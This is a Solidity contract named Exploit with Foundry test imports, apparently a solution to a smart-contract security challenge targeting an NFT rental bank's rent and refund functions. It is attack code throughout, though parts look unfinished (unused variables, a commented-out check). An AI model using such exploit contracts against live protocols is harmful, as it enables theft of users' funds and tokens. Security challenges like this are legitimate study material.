// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import {IERC721} from "openzeppelin-contracts/contracts/token/ERC721/IERC721.sol";
import {IERC721Receiver} from "openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";
import "forge-std/Test.sol";

interface INFTBank {
    function rent(address collection, uint256 id) external payable;
    function refund(address collection, uint256 id) external payable;
}

contract Exploit {
    INFTBank target;
    IERC721 nft;
    uint256 counter = 0;
    address owner;

    constructor(address _target, address _nft) {
        target = INFTBank(_target);
        nft = IERC721(_nft);
        owner = msg.sender;
    }

    function attack(uint256 id) external payable {
        // uint256 targetBalance = nft.balanceOf(address(target));
        target.rent{value: msg.value}(address(nft), id);
    }

    function refund(address nftAddress, uint256 id) external payable {
        nft.approve(address(target), id);
        target.refund{value: msg.value}(nftAddress, id);
    }

    function onERC721Received(address, address, uint256, bytes memory) public virtual returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
